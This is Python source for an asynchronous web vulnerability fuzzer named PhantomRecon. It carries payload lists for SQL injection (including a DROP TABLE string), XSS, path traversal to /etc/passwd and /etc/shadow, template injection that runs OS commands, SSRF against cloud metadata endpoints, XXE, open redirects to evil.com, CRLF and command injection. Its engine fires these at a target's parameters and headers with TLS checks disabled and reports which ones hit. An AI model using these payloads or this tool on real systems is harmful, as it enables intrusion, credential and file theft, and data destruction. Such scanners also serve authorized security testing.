from __future__ import annotations

import asyncio
import html
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Callable, Optional

import aiohttp


SQLI_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
    "1; DROP TABLE users--", "1' AND SLEEP(5)--", "1 AND 1=1",
    "1 AND 1=2", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--", "admin'--", "1' ORDER BY 1--",
    "1' ORDER BY 2--", "1' ORDER BY 3--", "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "1;WAITFOR DELAY '0:0:5'--", "1' AND BENCHMARK(5000000,MD5(1))--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>", "javascript:alert(1)",
    "'><script>alert(1)</script>", "\"><script>alert(1)</script>",
    "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>",
    "<input autofocus onfocus=alert(1)>", "<details open ontoggle=alert(1)>",
    "<a href='javascript:alert(1)'>click</a>",
    "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
]

LFI_PAYLOADS = [
    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
    "../../../../etc/passwd", "../../../../../etc/passwd",
    "../../../../../../etc/passwd", "../../../../../../../etc/passwd",
    "..%2Fetc%2Fpasswd", "..%252Fetc%252Fpasswd",
    "....//....//etc/passwd", "..././..././etc/passwd",
    "/etc/passwd", "/etc/shadow", "/etc/hosts",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\Windows\\win.ini", "..\\..\\..\\Windows\\win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input", "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
    "expect://id", "file:///etc/passwd",
]

SSTI_PAYLOADS = [
    "{{7*7}}", "{{7*'7'}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
    "{{config}}", "{{self}}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}",
    "{{range.constructor(\"return eval(\\\"global.process.mainModule.require('child_process').execSync('id').toString()\\\")\")()\n}}",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1/", "http://localhost/", "http://169.254.169.254/",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://192.168.0.1/", "http://10.0.0.1/",
    "http://0.0.0.0/", "http://[::1]/",
    "file:///etc/passwd", "dict://localhost:11211/stat",
    "gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
]

XXE_PAYLOADS = [
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>""",
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://CALLBACK/xxe.dtd">%xxe;]><foo/>""",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com", "//evil.com", "///evil.com",
    "http://evil.com", "https:evil.com", "//evil%2ecom",
    "https://evil.com%2f%2f", r"https:\\evil.com",
    "/\\evil.com", "http:///evil.com", "%0ahttps://evil.com",
]

CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie: crlfinjected=true",
    "%0aSet-Cookie: crlfinjected=true",
    "\r\nSet-Cookie: crlfinjected=true",
    "%0d%0aX-Custom: injected",
    "%0d%0a%0d%0a<script>alert(1)</script>",
]

CMD_INJECTION_PAYLOADS = [
    "; id", "| id", "& id", "`id`", "$(id)",
    "; sleep 5", "| sleep 5", "& sleep 5",
    "; cat /etc/passwd", "| cat /etc/passwd",
    "'; id; echo '", "\"; id; echo \"",
    "\n/usr/bin/id",
]

ALL_PAYLOADS: dict[str, list[str]] = {
    "sqli":            SQLI_PAYLOADS,
    "xss":             XSS_PAYLOADS,
    "lfi":             LFI_PAYLOADS,
    "ssti":            SSTI_PAYLOADS,
    "ssrf":            SSRF_PAYLOADS,
    "xxe":             XXE_PAYLOADS,
    "open_redirect":   OPEN_REDIRECT_PAYLOADS,
    "crlf":            CRLF_PAYLOADS,
    "cmd_injection":   CMD_INJECTION_PAYLOADS,
}

SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "mysql_num_rows", "pg_query",
    "sqlite_query", "odbc_exec", "sqlstate", "ora-", "mysql error",
    "syntax error", "unclosed quotation", "microsoft ole db",
    "warning: mysql", "valid mysql result", "mssql_query",
    "postgresql", "jdbc", "sqlexception",
]

XSS_REFLECTION_MARKERS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
]

LFI_SUCCESS_MARKERS = [
    "root:x:", "root:0:0:", "/bin/bash", "daemon:", "www-data:",
    "[fonts]", "[extensions]", "for 16-bit app support",
]

SSTI_RESULT_MARKERS = ["49", "7777777"]


@dataclass
class FuzzResult:
    url: str
    method: str
    param: str
    payload: str
    payload_type: str
    status_code: int
    response_length: int
    response_time: float
    is_vulnerable: bool
    evidence: str = ""
    extra: dict[str, Any] = field(default_factory=dict)
    timestamp: float = field(default_factory=time.time)

    def to_dict(self) -> dict:
        return {
            "url": self.url,
            "method": self.method,
            "param": self.param,
            "payload": self.payload,
            "payload_type": self.payload_type,
            "status_code": self.status_code,
            "response_length": self.response_length,
            "response_time": self.response_time,
            "is_vulnerable": self.is_vulnerable,
            "evidence": self.evidence,
        }


class FuzzEngine:
    def __init__(
        self,
        target: str,
        threads: int = 20,
        timeout: int = 10,
        delay: float = 0.0,
        payload_types: Optional[list[str]] = None,
        custom_payloads: Optional[list[str]] = None,
        headers: Optional[dict] = None,
        cookies: Optional[dict] = None,
        proxies: Optional[list[str]] = None,
        callback: Optional[Callable] = None,
        interactsh_url: Optional[str] = None,
    ) -> None:
        self.target = target
        self.threads = threads
        self.timeout = timeout
        self.delay = delay
        self.payload_types = payload_types or list(ALL_PAYLOADS.keys())
        self.custom_payloads = custom_payloads or []
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.proxies = proxies or []
        self.callback = callback
        self.interactsh_url = interactsh_url
        self.results: list[FuzzResult] = []
        self._sem = asyncio.Semaphore(threads)
        self._baseline_length: dict[str, int] = {}

    def _build_payloads(self) -> dict[str, list[str]]:
        payloads = {}
        for pt in self.payload_types:
            if pt in ALL_PAYLOADS:
                lst = list(ALL_PAYLOADS[pt])
                if self.interactsh_url:
                    lst = [p.replace("CALLBACK", self.interactsh_url) for p in lst]
                payloads[pt] = lst
        if self.custom_payloads:
            payloads["custom"] = self.custom_payloads
        return payloads

    async def fuzz_url_params(self, url: str) -> list[FuzzResult]:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return []

        payloads = self._build_payloads()
        tasks = []
        for param in params:
            for ptype, plist in payloads.items():
                for payload in plist:
                    tasks.append(self._fuzz_get_param(url, param, payload, ptype, params))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        return [r for r in results if isinstance(r, FuzzResult) and r.is_vulnerable]

    async def fuzz_post_params(self, url: str, params: dict[str, str]) -> list[FuzzResult]:
        payloads = self._build_payloads()
        tasks = []
        for param in params:
            for ptype, plist in payloads.items():
                for payload in plist:
                    tasks.append(self._fuzz_post_param(url, param, payload, ptype, dict(params)))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        return [r for r in results if isinstance(r, FuzzResult) and r.is_vulnerable]

    async def fuzz_headers(self, url: str) -> list[FuzzResult]:
        payloads = self._build_payloads()
        fuzz_headers = [
            "X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
            "Referer", "User-Agent", "X-Custom-Header",
        ]
        tasks = []
        for header in fuzz_headers:
            for ptype, plist in payloads.items():
                for payload in plist:
                    tasks.append(self._fuzz_header(url, header, payload, ptype))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        return [r for r in results if isinstance(r, FuzzResult) and r.is_vulnerable]

    async def _fuzz_get_param(
        self, url: str, param: str, payload: str, ptype: str, orig_params: dict
    ) -> Optional[FuzzResult]:
        async with self._sem:
            fuzzed = dict(orig_params)
            fuzzed[param] = [payload]
            parsed = urllib.parse.urlparse(url)
            new_qs = urllib.parse.urlencode(fuzzed, doseq=True)
            fuzz_url = parsed._replace(query=new_qs).geturl()

            start = time.time()
            try:
                connector = aiohttp.TCPConnector(ssl=False)
                async with aiohttp.ClientSession(connector=connector) as session:
                    async with session.get(
                        fuzz_url,
                        headers=self._build_headers(),
                        cookies=self.cookies,
                        timeout=aiohttp.ClientTimeout(total=self.timeout),
                        allow_redirects=False,
                    ) as resp:
                        body = await resp.text(errors="replace")
                        elapsed = time.time() - start
                        vuln, evidence = self._detect_vulnerability(body, resp.status, elapsed, payload, ptype)
                        result = FuzzResult(
                            url=fuzz_url, method="GET", param=param,
                            payload=payload, payload_type=ptype,
                            status_code=resp.status, response_length=len(body),
                            response_time=elapsed, is_vulnerable=vuln, evidence=evidence,
                        )
                        if vuln and self.callback:
                            self.callback(result)
                        if self.delay:
                            await asyncio.sleep(self.delay)
                        return result
            except Exception:
                return None

    async def _fuzz_post_param(
        self, url: str, param: str, payload: str, ptype: str, orig_params: dict
    ) -> Optional[FuzzResult]:
        async with self._sem:
            fuzzed = dict(orig_params)
            fuzzed[param] = payload
            start = time.time()
            try:
                connector = aiohttp.TCPConnector(ssl=False)
                async with aiohttp.ClientSession(connector=connector) as session:
                    async with session.post(
                        url,
                        data=fuzzed,
                        headers=self._build_headers(),
                        cookies=self.cookies,
                        timeout=aiohttp.ClientTimeout(total=self.timeout),
                        allow_redirects=False,
                    ) as resp:
                        body = await resp.text(errors="replace")
                        elapsed = time.time() - start
                        vuln, evidence = self._detect_vulnerability(body, resp.status, elapsed, payload, ptype)
                        result = FuzzResult(
                            url=url, method="POST", param=param,
                            payload=payload, payload_type=ptype,
                            status_code=resp.status, response_length=len(body),
                            response_time=elapsed, is_vulnerable=vuln, evidence=evidence,
                        )
                        if vuln and self.callback:
                            self.callback(result)
                        if self.delay:
                            await asyncio.sleep(self.delay)
                        return result
            except asyncio.TimeoutError:
                if ptype == "sqli" and "sleep" in payload.lower():
                    result = FuzzResult(
                        url=url, method="POST", param=param,
                        payload=payload, payload_type=ptype,
                        status_code=0, response_length=0,
                        response_time=self.timeout, is_vulnerable=True,
                        evidence="Time-based injection: request timed out",
                    )
                    if self.callback:
                        self.callback(result)
                    return result
                return None
            except Exception:
                return None

    async def _fuzz_header(self, url: str, header: str, payload: str, ptype: str) -> Optional[FuzzResult]:
        async with self._sem:
            hdrs = self._build_headers()
            hdrs[header] = payload
            start = time.time()
            try:
                connector = aiohttp.TCPConnector(ssl=False)
                async with aiohttp.ClientSession(connector=connector) as session:
                    async with session.get(
                        url, headers=hdrs, cookies=self.cookies,
                        timeout=aiohttp.ClientTimeout(total=self.timeout),
                        allow_redirects=False,
                    ) as resp:
                        body = await resp.text(errors="replace")
                        elapsed = time.time() - start
                        vuln, evidence = self._detect_vulnerability(body, resp.status, elapsed, payload, ptype)
                        return FuzzResult(
                            url=url, method="GET", param=f"Header:{header}",
                            payload=payload, payload_type=ptype,
                            status_code=resp.status, response_length=len(body),
                            response_time=elapsed, is_vulnerable=vuln, evidence=evidence,
                        )
            except Exception:
                return None

    def _detect_vulnerability(
        self, body: str, status: int, elapsed: float, payload: str, ptype: str
    ) -> tuple[bool, str]:
        body_lower = body.lower()

        if ptype == "sqli":
            for err in SQLI_ERRORS:
                if err in body_lower:
                    return True, f"SQL error detected: '{err}' in response"
            if elapsed > 4.5 and "sleep" in payload.lower():
                return True, f"Time-based SQLi: {elapsed:.2f}s delay"

        elif ptype == "xss":
            for marker in XSS_REFLECTION_MARKERS:
                if marker in body:
                    return True, f"XSS payload reflected unescaped: {marker[:40]}"
            if html.escape(payload) not in body and payload in body:
                return True, "XSS payload reflected without encoding"

        elif ptype == "lfi":
            for marker in LFI_SUCCESS_MARKERS:
                if marker in body:
                    return True, f"LFI successful — content marker: '{marker}'"

        elif ptype == "ssti":
            for marker in SSTI_RESULT_MARKERS:
                if marker in body:
                    return True, f"SSTI detected — expression evaluated: {marker}"

        elif ptype == "ssrf":
            if any(x in body_lower for x in ["ami-id", "instance-id", "iam", "computeMetadata"]):
                return True, "SSRF — cloud metadata accessed"

        elif ptype == "open_redirect":
            if status in (301, 302, 303, 307, 308):
                return True, f"Open redirect: HTTP {status}"

        elif ptype == "crlf":
            if "crlfinjected" in body_lower or "x-custom: injected" in body_lower:
                return True, "CRLF injection confirmed in response"

        elif ptype == "cmd_injection":
            if any(x in body for x in ["uid=", "gid=", "root:", "www-data"]):
                return True, "Command injection — OS output in response"

        return False, ""

    def _build_headers(self) -> dict:
        hdrs = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }
        hdrs.update(self.headers)
        return hdrs

    def generate_nuclei_templates(self, results: list[FuzzResult]) -> list[dict]:
        templates = []
        for r in results:
            if not r.is_vulnerable:
                continue
            tmpl = {
                "id": f"phantomrecon-{r.payload_type}-{hash(r.url) & 0xFFFF:04x}",
                "info": {
                    "name": f"PhantomRecon: {r.payload_type.upper()} in {r.param}",
                    "author": "phantomrecon",
                    "severity": self._ptype_severity(r.payload_type),
                    "description": f"Detected {r.payload_type} vulnerability in parameter '{r.param}'",
                },
                "requests": [
                    {
                        "method": r.method,
                        "path": [r.url],
                        "headers": self._build_headers(),
                        "matchers": [{"type": "word", "words": [r.evidence[:50]]}],
                    }
                ],
            }
            templates.append(tmpl)
        return templates

    @staticmethod
    def _ptype_severity(ptype: str) -> str:
        return {
            "sqli": "critical", "cmd_injection": "critical", "ssti": "critical",
            "xxe": "high", "ssrf": "high", "lfi": "high",
            "xss": "medium", "open_redirect": "medium", "crlf": "low",
        }.get(ptype, "medium")
